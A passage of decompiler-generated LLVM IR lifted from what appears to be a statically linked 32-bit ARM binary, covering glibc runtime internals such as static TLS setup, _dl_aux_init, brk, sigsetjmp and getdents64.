  %v1_17e98 = phi i32 [ %v0_17ddc.v3_17e04, %bb ], [ %v1_17e9825, %dec_label_pc_17e70 ]
  %stack_var_-52.3 = phi i32 [ %v3_17e00, %bb ], [ %stack_var_-52.0, %dec_label_pc_17e70 ]
  %stack_var_-48.3 = phi i32 [ %v3_17e0c, %bb ], [ %stack_var_-48.0, %dec_label_pc_17e70 ]
  %stack_var_-44.3 = phi i32 [ %v3_17e10, %bb ], [ %stack_var_-44.0, %dec_label_pc_17e70 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17e74 = add i32 %v1_17e74, %v0_17e74
  %v2_17e78 = udiv i32 %v2_17e74, %storemerge
  store i32 %v2_17e78, i32* %r0.global-to-local, align 4
  %v2_17e7c = mul i32 %v2_17e78, %storemerge
  store i32 %v2_17e7c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17e84 = add i32 %v0_17e84, 72
  %v3_17e84 = inttoptr i32 %v2_17e84 to i32*
  %v4_17e84 = load i32, i32* %v3_17e84, align 4
  store i32 %v4_17e84, i32* %r3.global-to-local, align 4
  %v1_17e88 = inttoptr i32 %v4_17e84 to i32*
  %v2_17e88 = load i32, i32* %v1_17e88, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_17e90 = add i32 %v1_17e98, 1168
  %v2_17e94 = add i32 %v1_17e90, %stack_var_-52.3
  %v2_17e98 = add i32 %v2_17e94, %v2_17e7c
  %v2_17e9c = add i32 %v2_17e98, %v2_17e88
  store i32 %v2_17e9c, i32* %r0.global-to-local, align 4
  %v1_17ea0 = call i32 @__GI_sbrk(i32 %v2_17e9c)
  %v1_17ea4 = load i32, i32* %fp.global-to-local, align 4
  %v1_17eac = sub i32 0, %v1_17ea4
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_17ea4 = add i32 %v1_17ea0, 1167
  %v1_17eb4 = add i32 %v2_17ea4, %v1_17ea4
  %v2_17eb8 = and i32 %v1_17eb4, %v1_17eac
  store i32 %v2_17eb8, i32* @r5, align 4
  %v1_17ec0 = load i32, i32* %sl.global-to-local, align 4
  %v3_17ec0 = add i32 %v1_17ec0, 10236
  %v4_17ec0 = inttoptr i32 %v3_17ec0 to i32*
  store i32 62, i32* %v4_17ec0, align 4
  %v0_17ec8 = load i32, i32* @r5, align 4
  %v1_17ec8 = load i32, i32* %sb.global-to-local, align 4
  %v2_17ec8 = add i32 %v1_17ec8, %v0_17ec8
  store i32 %v2_17ec8, i32* @ip, align 4
  %v0_17ecc = load i32, i32* %sl.global-to-local, align 4
  %v1_17ecc = load i32, i32* %r4.global-to-local, align 4
  %v2_17ecc = add i32 %v1_17ecc, %v0_17ecc
  store i32 %v2_17ecc, i32* %r4.global-to-local, align 4
  %v2_17ed0 = add i32 %v0_17ecc, 11524
  store i32 %v2_17ed0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_17ec8, i32* @r0, align 4
  %v2_17ee4 = add i32 %v2_17ecc, 16
  %v3_17ee4 = inttoptr i32 %v2_17ee4 to i32*
  store i32 %v2_17ec8, i32* %v3_17ee4, align 4
  %v0_17ee8 = load i32, i32* %sb.global-to-local, align 4
  %v1_17ee8 = load i32, i32* %r8.global-to-local, align 4
  %v2_17ee8 = add i32 %v1_17ee8, 40
  %v3_17ee8 = inttoptr i32 %v2_17ee8 to i32*
  store i32 %v0_17ee8, i32* %v3_17ee8, align 4
  %v0_17eec = load i32, i32* @r3, align 4
  %v1_17eec = trunc i32 %v0_17eec to i8
  %v2_17eec = load i32, i32* %r4.global-to-local, align 4
  %v3_17eec = add i32 %v2_17eec, 20
  %v4_17eec = inttoptr i32 %v3_17eec to i8*
  store i8 %v1_17eec, i8* %v4_17eec, align 1
  %v0_17ef0 = load i32, i32* %r4.global-to-local, align 4
  %v1_17ef0 = add i32 %v0_17ef0, 8
  store i32 %v1_17ef0, i32* @r4, align 4
  %v0_17ef4 = call i32 @memcpy()
  %v0_17efc = load i32, i32* @r4, align 4
  %v1_17efc = load i32, i32* @r5, align 4
  %v2_17efc = inttoptr i32 %v1_17efc to i32*
  store i32 %v0_17efc, i32* %v2_17efc, align 4
  %v0_17f00 = load i32, i32* @r5, align 4
  store i32 %v0_17f00, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17f00, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_137f8.550 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17f14 = load i32, i32* %sl.global-to-local, align 4
  %v2_17f14 = add i32 %v0_17f14, 84
  %v3_17f14 = inttoptr i32 %v2_17f14 to i32*
  %v4_17f14 = load i32, i32* %v3_17f14, align 4
  store i32 %v4_17f14, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17f20 = add i32 %v0_17f14, 60
  %v3_17f20 = inttoptr i32 %v2_17f20 to i32*
  %v4_17f20 = load i32, i32* %v3_17f20, align 4
  store i32 %v4_17f20, i32* %r0.global-to-local, align 4
  %v3_17f28 = add i32 %v0_17f14, 10748
  %v4_17f28 = inttoptr i32 %v3_17f28 to i32*
  store i32 64, i32* %v4_17f28, align 4
  %v1_17f30 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f30 = add i32 %v1_17f30, 20
  %v3_17f30 = inttoptr i32 %v2_17f30 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17f30, align 4
  %v1_17f38 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f38 = add i32 %v1_17f38, 24
  %v3_17f38 = inttoptr i32 %v2_17f38 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17f38, align 4
  %v1_17f40 = load i32, i32* %r0.global-to-local, align 4
  %v2_17f40 = inttoptr i32 %v1_17f40 to i32*
  store i32 1, i32* %v2_17f40, align 4
  %v1_17f48 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f48 = add i32 %v1_17f48, 28
  %v3_17f48 = inttoptr i32 %v2_17f48 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17f48, align 4
  %v0_17f50 = load i32, i32* @r6, align 4
  %v2_17f50 = icmp eq i32 %v0_17f50, 0
  %v1_17f54 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f54 = add i32 %v1_17f54, 44
  %v3_17f54 = inttoptr i32 %v2_17f54 to i32*
  store i32 1, i32* %v3_17f54, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_17f5c = load i32, i32* %sl.global-to-local, align 4
  %v1_17f5c = load i32, i32* %r1.global-to-local, align 4
  %v2_17f5c = add i32 %v1_17f5c, %v0_17f5c
  store i32 %v2_17f5c, i32* %r2.global-to-local, align 4
  %v1_17f60 = load i32, i32* @r6, align 4
  br i1 %v2_17f50, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17e74
  store i32 %v1_17f60, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17f6c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f6c35 = add i32 %v1_17f6c34, 32
  %v3_17f6c36 = inttoptr i32 %v2_17f6c35 to i32*
  store i32 %v1_17f60, i32* %v3_17f6c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17e74
  %v2_17f64 = add i32 %v1_17f60, -1
  store i32 %v2_17f64, i32* %r0.global-to-local, align 4
  %v1_17f6c = load i32, i32* %r8.global-to-local, align 4
  %v2_17f6c = add i32 %v1_17f6c, 32
  %v3_17f6c = inttoptr i32 %v2_17f6c to i32*
  store i32 %v1_17f60, i32* %v3_17f6c, align 4
  %v1_17f70 = load i32, i32* @r6, align 4
  store i32 %v1_17f70, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17f74 = load i32, i32* %r8.global-to-local, align 4
  %v1_17f74 = load i32, i32* %r2.global-to-local, align 4
  %v2_17f74 = add i32 %v1_17f74, 28
  %v3_17f74 = inttoptr i32 %v2_17f74 to i32*
  store i32 %v0_17f74, i32* %v3_17f74, align 4
  %v0_17f78 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f78 = load i32, i32* %ip.global-to-local, align 4
  %v2_17f78 = inttoptr i32 %v1_17f78 to i32*
  store i32 %v0_17f78, i32* %v2_17f78, align 4
  %v0_17f7c = load i32, i32* %r0.global-to-local, align 4
  %v1_17f7c = load i32, i32* %r3.global-to-local, align 4
  %v2_17f7c = add i32 %v1_17f7c, %v0_17f7c
  store i32 %v2_17f7c, i32* %r0.global-to-local, align 4
  %v1_17f80 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17f50, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17f88.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17f88 = phi i32 [ %v0_17f88.pre, %._crit_edge ], [ %v1_17f80, %bb54 ]
  %v2_17f84 = udiv i32 %v2_17f7c, %v1_17f80
  %v2_17f88 = load i32, i32* %sb.global-to-local, align 4
  %v3_17f88 = mul i32 %v2_17f84, %v0_17f88
  %v4_17f88 = add i32 %v2_17f88, %v3_17f88
  store i32 %v4_17f88, i32* @r0, align 4
  %v0_17f8c = load i32, i32* %fp.global-to-local, align 4
  %v2_17f8c = icmp ult i32 %v0_17f8c, 16
  %v0_17f8c. = select i1 %v2_17f8c, i32 16, i32 %v0_17f8c
  store i32 %v0_17f8c., i32* @r1, align 4
  %v2_17f9c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17f9c, i32* @r4, align 4
  store i32 %v6_17db8, i32* @r5, align 4
  store i32 %v15_17db8, i32* %r8.global-to-local, align 4
  store i32 %v18_17db8, i32* %sb.global-to-local, align 4
  store i32 %v21_17db8, i32* %sl.global-to-local, align 4
  store i32 %v24_17db8, i32* %fp.global-to-local, align 4
  store i32 %v27_17db8, i32* @lr, align 4
  %v0_17fa0 = call i32 @init_static_tls()
  store i32 %v0_17fa0, i32* %r0.global-to-local, align 4
  %v0_17fac.pre = load i32, i32* @ip, align 4
  %v1_17e74.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17e84.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17fa4

dec_label_pc_17e30.dec_label_pc_17fa4.loopexit_crit_edge: ; preds = %dec_label_pc_17e2c
  br label %dec_label_pc_17fa4.loopexit

dec_label_pc_17fa4.loopexit:                      ; preds = %dec_label_pc_17e30.dec_label_pc_17fa4.loopexit_crit_edge, %dec_label_pc_17de4
  br label %dec_label_pc_17fa4

dec_label_pc_17fa4:                               ; preds = %dec_label_pc_17fa4.loopexit, %entry, %bb55
  %v0_17e84.pre.pre = phi i32 [ ptrtoint (i32* @global_var_221d4.362 to i32), %dec_label_pc_17fa4.loopexit ], [ ptrtoint (i32* @global_var_221d4.362 to i32), %entry ], [ %v0_17e84.pre.pre.pre, %bb55 ]
  %v1_17e74.pre.pre = phi i32 [ %v0_17dd8, %dec_label_pc_17fa4.loopexit ], [ %v0_17dd8, %entry ], [ %v1_17e74.pre.pre.pre, %bb55 ]
  %v0_17fac = phi i32 [ %v0_17ddc, %dec_label_pc_17fa4.loopexit ], [ %v0_17ddc, %entry ], [ %v0_17fac.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_17fac, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17e70

; uselistorder directives
  uselistorder i32 %v0_17fac, { 1, 0 }
  uselistorder i32 %v1_17f60, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17ecc, { 1, 0 }
  uselistorder i32 %v2_17ec8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17e2c, { 2, 1, 0 }
  uselistorder i32 %v3_17e04, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_17e0c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17e30, { 1, 0 }
  uselistorder i32 %v0_17ddc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_17dd8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17dcc, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 8, 9, 10, 15, 12, 13, 14 }
  uselistorder i32* %r1.global-to-local, { 4, 3, 5, 6, 7, 0, 9, 8, 10, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_17fa4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17e74, { 1, 0 }
  uselistorder label %dec_label_pc_17e70, { 1, 0 }
  uselistorder label %dec_label_pc_17df4, { 1, 0 }
}

define i32 @function_17fc4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17fc4:
  %v0_17fc4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17fc4, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_17fc4
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_17fc4
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_17ff0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_17ff0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  %v4_18000 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 156) to i32*), align 4
  %v4_18008 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 104) to i32*), align 4
  store i32 %v4_18008, i32* %r1.global-to-local, align 4
  %v1_1800c = add i32 %arg1, 44
  %v2_1800c = inttoptr i32 %v1_1800c to i32*
  %v3_1800c = load i32, i32* %v2_1800c, align 4
  %v1_18010 = add i32 %arg1, 28
  %v2_18010 = inttoptr i32 %v1_18010 to i32*
  %v3_18010 = load i32, i32* %v2_18010, align 4
  store i32 %v3_18010, i32* %r2.global-to-local, align 4
  %v2_18014 = inttoptr i32 %v4_18000 to i32*
  store i32 %v3_1800c, i32* %v2_18014, align 4
  %v0_18018 = load i32, i32* %r2.global-to-local, align 4
  %v1_18018 = load i32, i32* %r1.global-to-local, align 4
  %v2_18018 = inttoptr i32 %v1_18018 to i32*
  store i32 %v0_18018, i32* %v2_18018, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18024(i32 %arg1) local_unnamed_addr {
dec_label_pc_18024:
  %v0_18024 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18024, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18024
  %v1_18024 = load i32, i32* @ip, align 4
  %v3_18024 = mul i32 %v1_18024, %arg1
  %v2_18028 = load i32, i32* @r8, align 4
  %v4_18028 = and i32 %v2_18028, %v3_18024
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18024, %bb
  %v5_18028 = phi i32 [ %arg1, %dec_label_pc_18024 ], [ %v4_18028, %bb ]
  ret i32 %v5_18028

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_18034 = add i32 %arg1, 40
  store i32 %v1_18034, i32* %r2.global-to-local, align 4
  %v1_18038 = inttoptr i32 %v1_18034 to i32*
  %v2_18038 = load i32, i32* %v1_18038, align 4
  store i32 %v2_18038, i32* %r2.global-to-local, align 4
  %v3_18038 = add i32 %arg1, 44
  %v4_18038 = inttoptr i32 %v3_18038 to i32*
  %v5_18038 = load i32, i32* %v4_18038, align 4
  store i32 %v5_18038, i32* %r3.global-to-local, align 4
  %v0_1803c = call i32 @__aeabi_read_tp()
  %v1_18040 = inttoptr i32 %v0_1803c to i32*
  %v2_18040 = load i32, i32* %v1_18040, align 4
  store i32 %v2_18040, i32* %r1.global-to-local, align 4
  %v3_18044 = mul i32 %v5_18038, 8
  store i32 %v3_18044, i32* %r3.global-to-local, align 4
  %v1_18048 = load i32, i32* %r2.global-to-local, align 4
  %v2_18048 = add i32 %v1_18048, %v0_1803c
  %v3_1804c = add i32 %v3_18044, %v2_18040
  %v4_1804c = inttoptr i32 %v3_1804c to i32*
  store i32 %v2_18048, i32* %v4_1804c, align 4
  %v0_18050 = load i32, i32* %r3.global-to-local, align 4
  %v1_18050 = load i32, i32* %r1.global-to-local, align 4
  %v2_18050 = add i32 %v1_18050, %v0_18050
  store i32 %v2_18050, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_18058 = add i32 %v2_18050, 4
  %v5_18058 = inttoptr i32 %v4_18058 to i8*
  store i8 1, i8* %v5_18058, align 1
  %v0_1805c = load i32, i32* @r4, align 4
  %v1_1805c = add i32 %v0_1805c, 20
  store i32 %v1_1805c, i32* %r1.global-to-local, align 4
  %v1_18060 = inttoptr i32 %v1_1805c to i32*
  %v2_18060 = load i32, i32* %v1_18060, align 4
  store i32 %v2_18060, i32* @r1, align 4
  %v3_18060 = add i32 %v0_1805c, 24
  %v4_18060 = inttoptr i32 %v3_18060 to i32*
  %v5_18060 = load i32, i32* %v4_18060, align 4
  store i32 %v5_18060, i32* %r2.global-to-local, align 4
  %v5_18064 = call i32 @__GI_mempcpy(i32 %v2_18048, i32 %v2_18060, i32 %v5_18060, i32 1)
  %v0_18068 = load i32, i32* @r4, align 4
  %v1_18068 = add i32 %v0_18068, 28
  store i32 %v1_18068, i32* %r3.global-to-local, align 4
  %v1_1806c = inttoptr i32 %v1_18068 to i32*
  %v2_1806c = load i32, i32* %v1_1806c, align 4
  store i32 %v2_1806c, i32* %r2.global-to-local, align 4
  %v3_1806c = add i32 %v0_18068, 24
  %v4_1806c = inttoptr i32 %v3_1806c to i32*
  %v5_1806c = load i32, i32* %v4_1806c, align 4
  store i32 %v5_1806c, i32* %r3.global-to-local, align 4
  %v2_18070 = sub i32 %v5_1806c, %v2_1806c
  store i32 %v2_18070, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18078 = inttoptr i32 %v5_18064 to i8*
  %v4_18078 = call i32 @__GI_memset(i8* %v3_18078, i32 0, i32 %v2_18070)
  ret i32 %v4_18078

; uselistorder directives
  uselistorder i32 %v3_18044, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_180c8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_180dc = load i32, i32* @r0, align 4
  %v1_180e0 = inttoptr i32 %v0_180dc to i32*
  %v2_180e0 = load i32, i32* @r4, align 4
  store i32 %v2_180e0, i32* %v1_180e0, align 4
  %v3_180e0 = add i32 %v0_180dc, 4
  %v4_180e0 = inttoptr i32 %v3_180e0 to i32*
  %v5_180e0 = load i32, i32* @r5, align 4
  store i32 %v5_180e0, i32* %v4_180e0, align 4
  %v6_180e0 = add i32 %v0_180dc, 8
  %v7_180e0 = inttoptr i32 %v6_180e0 to i32*
  %v8_180e0 = load i32, i32* @r6, align 4
  store i32 %v8_180e0, i32* %v7_180e0, align 4
  %v9_180e0 = add i32 %v0_180dc, 12
  %v10_180e0 = inttoptr i32 %v9_180e0 to i32*
  %v11_180e0 = load i32, i32* @r7, align 4
  store i32 %v11_180e0, i32* %v10_180e0, align 4
  %v12_180e0 = add i32 %v0_180dc, 16
  %v13_180e0 = inttoptr i32 %v12_180e0 to i32*
  %v14_180e0 = load i32, i32* @r8, align 4
  store i32 %v14_180e0, i32* %v13_180e0, align 4
  %v15_180e0 = add i32 %v0_180dc, 20
  %v16_180e0 = inttoptr i32 %v15_180e0 to i32*
  %v17_180e0 = load i32, i32* @sb, align 4
  store i32 %v17_180e0, i32* %v16_180e0, align 4
  %v18_180e0 = add i32 %v0_180dc, 24
  %v19_180e0 = inttoptr i32 %v18_180e0 to i32*
  %v20_180e0 = load i32, i32* @sl, align 4
  store i32 %v20_180e0, i32* %v19_180e0, align 4
  %v21_180e0 = add i32 %v0_180dc, 28
  %v22_180e0 = inttoptr i32 %v21_180e0 to i32*
  %v23_180e0 = load i32, i32* @fp, align 4
  store i32 %v23_180e0, i32* %v22_180e0, align 4
  %v24_180e0 = add i32 %v0_180dc, 32
  %v25_180e0 = inttoptr i32 %v24_180e0 to i32*
  %v27_180e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_180e0, i32* %v25_180e0, align 4
  %v28_180e0 = add i32 %v0_180dc, 36
  %v29_180e0 = inttoptr i32 %v28_180e0 to i32*
  %v30_180e0 = load i32, i32* @lr, align 4
  store i32 %v30_180e0, i32* %v29_180e0, align 4
  %v0_180e4 = call i32 @__sigjmp_save()
  ret i32 %v0_180e4

; uselistorder directives
  uselistorder i32 %v0_180dc, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 109, 110, 13, 14, 15, 16, 17, 18, 19, 20, 97, 98, 99, 100, 101, 103, 102, 104, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 3, 0, 1, 2, 4, 5, 6, 7, 8, 41, 40, 46, 47, 42, 43, 44, 45, 21, 22, 23, 24, 25, 26, 27, 28, 29, 48, 49, 50, 51, 52, 53, 54, 55, 9, 10, 11, 12, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 69, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 85, 86, 88, 89, 90, 91, 92, 93, 94, 95, 96, 105, 106, 107, 108 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_180ec = load i32, i32* @r5, align 4
  %v12_180ec = load i32, i32* @r7, align 4
  %v1_180f0 = add i32 %arg3, 14
  %v2_180f8 = ptrtoint i32* %stack_var_-72 to i32
  %v1_180fc = and i32 %v1_180f0, -8
  %v2_18100 = sub i32 %v2_180f8, %v1_180fc
  %v1_18104 = add i32 %v2_18100, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_18148, label %dec_label_pc_1812c

dec_label_pc_1812c:                               ; preds = %entry
  %v1_18130 = sub i32 0, %arg1
  %v3_18134 = load i16, i16* @global_var_2222c.358, align 2
  %v4_18134 = sext i16 %v3_18134 to i32
  %v0_18138 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18140 = add i32 %v4_18134, %v0_18138
  %v4_18140 = inttoptr i32 %v3_18140 to i32*
  store i32 %v1_18130, i32* %v4_18140, align 4
  br label %dec_label_pc_18218

dec_label_pc_18148:                               ; preds = %entry
  br i1 false, label %dec_label_pc_18218, label %dec_label_pc_18150

dec_label_pc_18150:                               ; preds = %dec_label_pc_18148
  %v2_18150 = add i32 %v1_18104, %arg1
  store i32 %v2_18150, i32* %r1.global-to-local, align 4
  %v2_18154 = add i32 %tmp, %arg3
  store i32 %v1_18104, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18200

dec_label_pc_18170:                               ; preds = %dec_label_pc_18200
  %v1_18170 = add i32 %v0_181d0, 16
  %v2_18170 = inttoptr i32 %v1_18170 to i16*
  %v3_18170 = load i16, i16* %v2_18170, align 2
  %v4_18170 = zext i16 %v3_18170 to i32
  %v1_18174 = add nsw i32 %v4_18170, -19
  store i32 %v1_18174, i32* @r2, align 4
  %v1_18178 = add nuw nsw i32 %v4_18170, 7
  %v1_1817c = and i32 %v1_18178, 131064
  store i32 %v1_1817c, i32* @ip, align 4
  %v2_18184 = add i32 %v1_1817c, %v0_181d8
  store i32 %v2_18184, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_18184, %v2_18154
  br i1 %tmp24, label %dec_label_pc_18190, label %dec_label_pc_181cc

dec_label_pc_18190:                               ; preds = %dec_label_pc_18170
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18198 = load i32, i32* %r8.global-to-local, align 4
  %v0_1819c = load i32, i32* %sb.global-to-local, align 4
  %v1_181a0 = load i32, i32* @sp, align 4
  %v2_181a0 = inttoptr i32 %v1_181a0 to i32*
  store i32 0, i32* %v2_181a0, align 4
  %v4_181a4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_18198, i32 %v0_1819c)
  %v0_181a8 = load i32, i32* @r5, align 4
  %v1_181a8 = load i32, i32* %sl.global-to-local, align 4
  %v9_181a8 = icmp eq i32 %v0_181a8, %v1_181a8
  br i1 %v9_181a8, label %dec_label_pc_181b0, label %dec_label_pc_18214

dec_label_pc_181b0:                               ; preds = %dec_label_pc_18190
  %v0_181b4 = call i32 @__aeabi_read_tp()
  %v3_181b8 = load i16, i16* @global_var_2222c.358, align 2
  %v4_181b8 = sext i16 %v3_181b8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_181c4 = add i32 %v4_181b8, %v0_181b4
  %v4_181c4 = inttoptr i32 %v3_181c4 to i32*
  store i32 22, i32* %v4_181c4, align 4
  br label %dec_label_pc_18218

dec_label_pc_181cc:                               ; preds = %dec_label_pc_18170
  %v1_181cc = inttoptr i32 %v0_181d0 to i32*
  %v2_181cc = load i32, i32* %v1_181cc, align 4
  %v3_181cc = add i32 %v0_181d0, 4
  %v4_181cc = inttoptr i32 %v3_181cc to i32*
  %v5_181cc = load i32, i32* %v4_181cc, align 4
  store i32 %v5_181cc, i32* @r4, align 4
  %v1_181d0 = add i32 %v0_181d0, 8
  store i32 %v1_181d0, i32* %r8.global-to-local, align 4
  %v1_181d4 = inttoptr i32 %v1_181d0 to i32*
  %v2_181d4 = load i32, i32* %v1_181d4, align 4
  store i32 %v2_181d4, i32* %r8.global-to-local, align 4
  %v3_181d4 = add i32 %v0_181d0, 12
  %v4_181d4 = inttoptr i32 %v3_181d4 to i32*
  %v5_181d4 = load i32, i32* %v4_181d4, align 4
  store i32 %v5_181d4, i32* %sb.global-to-local, align 4
  %v1_181d8 = inttoptr i32 %v0_181d8 to i32*
  store i32 %v2_181cc, i32* %v1_181d8, align 4
  %v3_181d8 = add i32 %v0_181d8, 4
  %v4_181d8 = inttoptr i32 %v3_181d8 to i32*
  %v5_181d8 = load i32, i32* @r4, align 4
  store i32 %v5_181d8, i32* %v4_181d8, align 4
  %v0_181dc = load i32, i32* %r8.global-to-local, align 4
  %v1_181dc = load i32, i32* @r5, align 4
  %v2_181dc = add i32 %v1_181dc, 8
  %v3_181dc = inttoptr i32 %v2_181dc to i32*
  store i32 %v0_181dc, i32* %v3_181dc, align 4
  %v0_181e0 = load i32, i32* %sb.global-to-local, align 4
  %v1_181e0 = load i32, i32* @r5, align 4
  %v2_181e0 = add i32 %v1_181e0, 12
  %v3_181e0 = inttoptr i32 %v2_181e0 to i32*
  store i32 %v0_181e0, i32* %v3_181e0, align 4
